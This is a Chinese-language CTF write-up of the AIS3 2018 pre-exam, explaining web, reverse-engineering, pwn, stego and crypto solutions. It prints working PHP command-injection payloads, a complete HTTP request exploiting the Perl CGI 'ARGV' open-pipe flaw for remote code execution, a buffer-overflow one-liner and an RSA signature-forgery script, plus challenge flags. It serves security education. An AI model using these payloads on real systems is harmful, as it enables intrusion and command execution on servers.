# AIS3 2018 pre-exam

- Result: 
    - Rank 10
    - 31分 慘

## Web

### warmup

這題的話從Response Header可以看到`Partial-Flag`

並且GET參數為7，試著改動這個數字，可以發現Partial-Flag改變惹

所以暴力踹一輪，就能得到完整的flag

### hidden

這題把`c`和`s`參數塞回去，可以拿到下一輪的`c`和`s`

寫個腳本踹一輪

flag會出現在某一輪的header中，但不會停下來，所以要自己檢查

`AIS3{g00d_u_know_how_2_script_4_W3B_a64c06dd9c016cfe8825b10cffde21ad}`

### sushi

這題解法很多：

1. strpos沒有真正擋掉`"`，只要出現參數開頭，一樣可以使用 (strpos會回傳0)

所以可以: ``` ".`ls`." ```

2. 可以利用PHP String特性

``` {${phpinfo()}} ```

``` {${system(ls)}} ```

3. 執行任意長度指令 (把`$_`塞回去)

``` ${@system($_)}%0als ```

``` ${@system($_)}|ls ```

...

這題出得很仁慈，只要你能`ls`

就能看到藏在網站根目錄下的flag檔名

就能直接用瀏覽器訪問存取flag

`AIS3{php_is_very_very_very_easyyyyyy}`

### perljam

這題其實在考Blcakhat perl jam 2裡面demo提到的洞

首先，可以發現有`.git`

然後可以還原`index.cgi`的source code

這個source code做的事很簡單，就是把我們上傳文件的內容print出來

這個code其實跟demo裡面的那份code一模一樣，其實就是當年perl官方的example code

(沒錯，perl官方當年的example可以被RCE，詳細請看: https://www.youtube.com/watch?v=BYl3-c2JSL8)

基本上因為這是pre-exam，所以沒有出得很刁鑽，沒有改動example code

你只要能google到相關資料，基本上就能解掉惹 


以下大概介紹一下漏洞成因：

`upload()`被大家認為會去檢查`file`參數是不是一個上傳的檔案

但實際上`upload()`是檢查`file`參數的其中一個value是不是上傳的檔案

=> 上傳一個檔案，並且assign一個`scalar`給同個參數，一樣會work!

`param()`會回傳一個所有參數值的LIST，但是只有「第一個值」會被塞進`$file`

如果scalar value被放到第一個，那麼`$file`就會變成我們的scalar而不是上傳的檔案

$file is now a regular string!

`<>`在strings的狀況下不會work

但如果這個string是`ARGV`就另當別論惹

在這個狀況下，`<>`會迴圈跑過`ARG values`，並且把每一個都塞進`open()`中!

`open()`一般會依據給的file path開啟一個file descriptor

但有個狀況例外，就是`|`被加到string的尾巴

在這個狀況下，open就會跟`exec()`一樣執行

e.g.  `/test.cgi?ls|`

(ruby也有類似的command injection概念)

所以我們這樣做，就能RCE惹

payload:

```
POST /cgi-bin/index.cgi?/readflag| HTTP/1.1
Host: xxx.yy
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: multipart/form-data; Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBmriDnOpKyHMfymW
Content-Length: 271

------WebKitFormBoundaryBmriDnOpKyHMfymW
Content-Disposition: form-data; name="file"

ARGV
------WebKitFormBoundaryBmriDnOpKyHMfymW
Content-Disposition: form-data; name="file"; filename="we"
Content-Type: text/aaaa

123
------WebKitFormBoundaryBmriDnOpKyHMfymW--
```

## Reverse

### find

藏了一堆假flag

用正規表達式去找就行惹

水題

### secret

這題可以直接patch

他會對flag做一些運算

我們可以patch到讓它直接噴flag

把 `jne xx` 改成 `nop`
把 `xor v4` 改成 `xor v6`

然後他會把flag噴到`/tmp/secret`

`AIS3{tHere_1s_a_VErY_VerY_VeRY_1OoO00O0oO0OOoO0Oo000OOoO00o00oG_f1@g_iN_my_m1Nd}`


### crackme

看一下可以知道是.net program
直接尻`dnspy`

可以看到一條陣列，一臉flag樣:

`a = [234, 226, 248, 152, 208, 154, 223, 244, 226, 158, 244, 238, 234, 216, 210, 244, 223, 228, 244, 232, 249, 159, 200, 192, 244, 230, 206, 138, 214]`

直接根據程式邏輯尻一個腳本:  (他其實直接每個字元 xor 171就是flag惹)

```python
b = ''
for i in range(len(a)):
    b += chr(a[i] ^ 171)
print b
```

`AIS3{1t_I5_EAsy_tO_CR4ck_Me!}`


### calc

執行檔是用go寫的

賽中用ida pro看到眼睛脫窗，沒解出來

## Pwn

### mail

就...單純的Buffer overflow

`perl -e 'print "A"x40,"\x96\x07\x40\x00\x00\x00\x00\x00"'`

`AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!_I_d0nt_3ant_t0_giu3_QwQ}`

### darling

這題只能往低的位址蓋，不能往高位蓋

所以蓋不到當前stack frame的return address

但是他後面會call printf，我們可以蓋掉它的return address:


`-5`

`4196310` (debug的位址)

`AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r_b0nud_&_10w3r_bounp}`

### justfmt

沒看QQ

### Magic World

one byte overflow

可以蓋rbp控stack frame(stack migration)

然後有format string的洞可以leak libc base

接著直接one gadget就行

## Misc

### flags

這題藏了一堆假flag，浪費不少時間

最後仔細看圖片，會發現右下角的框框，圖案有點不規律

放大來看是一堆`.`和`_`

發揮通靈之術，可以猜他是morse code

解出來...Bang!

`AIS3{YOUFINDTHEREALFLAGOHYEAH}`

### svega

是一個mp3檔

直接找工具，會發現有個工具叫`mp3stego`

`decode -X svega.mp3`

為啥知道要用這個工具? 因為他的範例mp3名字也是svega...

直接解開就能拿到flag

`AIS3{I_HearD_imPlIeD_Fl46_1N_TH3_5oN6}`

## Crypto

### POW

就只是個Proof of work...

隨便喇一個就行

### XOR

就...xor

慢慢喇就能喇出來惹

```python
with open('flag-encrypted-511ab4a9fd7bb2d216ab5b5afa7fae5742eef94e', 'r') as data:
    flag = data.read()

def xor(X, Y):
    return ([chr(ord(x) ^ ord(y)) for x, y in zip(X, Y)])

for i in range(256):       
    k = ''
    k += chr(ord(flag[0])^ord('A'))
    k += chr(ord(flag[1])^ord('I'))
    k += chr(ord(flag[2])^ord('S'))
    k += chr(ord(flag[3])^ord('3'))
    k += chr(ord(flag[4])^ord('{'))
    k += chr(79)
    k += chr(46)
    k += chr(146)
    k += chr(167)
    k += chr(i)
    res =  chr(ord(k[8])^ord(k[9])) == flag[159]
    if res:
        print i
        break

tmp = k
l = 10
ans = ''
for i in range(16):
    res = ''
    res = xor(flag[i*l:][:l], tmp)
    for h in res:
        ans += h

print ans

```

### IOU

這題他sign的不是hash

由於`sig^e = m (mod n)`

所以我們可以暴力踹`sig` (迴圈從1開始往後跑)

然後看產出來的m，split出來的第三個是不是數字，且有沒有大於10

有的話，這就是解答惹

腳本:

```python
# AIS3{D0cT0R StRaNG3 - F0rgERy ATTaCk Ag4InsT RSa DIgital SigNatUrE}
from Crypto.Util.number import long_to_bytes
from pwn import *

while True:
    r = remote('104.199.235.135',20002)
    r.recvuntil("x[:6] == '")
    zz = r.recvuntil("'")[:-1]
    print zz
    qq = '000000'
    print qq
    ok = 0
    for i in range(8234560):
        m = hashlib.sha256()
        m.update(zz+str(i))
        #print str(i)+gg
        s = m.hexdigest()
        #print s[:6]
        if s[:6] == qq:
            print zz+str(i), s
            r.sendline(zz + str(i))
            ok = 1
            break

    if ok:
        print "ok"
    else:
        r.close()
        continue
    r.recvuntil('n = ')
    n = int(r.recvline()[:-1])

    print("n:", n)

    e = 65537
    num = 100
    gotit = 0

    while True:
            if num > 5000000:
                break
            #tmp = (num ** e) % n  Don't use this!
            tmp = pow(num, e, n)
            gg = long_to_bytes(tmp)
            if num % 10 == 0:
                    print("now:",num)
            arr = gg.split()
            if len(arr) > 3:
                ele = arr[3]
                fl = 0
                for i in ele:
                    if i not in ['1','2','3','4','5','6','7','8','9','0', ' ']:
                        fl = 1
                        break
                if fl == 0:
                    bucks = int(arr[3])
                    print bucks
                    if bucks > 10:
                            print("m:",tmp)
                            print("sig:",str(num))
                            print(gg)
                            r.sendline(str(tmp))
                            r.sendline(str(num))
                            print("Found! ",num)
                            gotit = 1
                            break
            num += 1

    if gotit == 1:
        r.interactive()
```

### EFAIL

沒解Q___Q
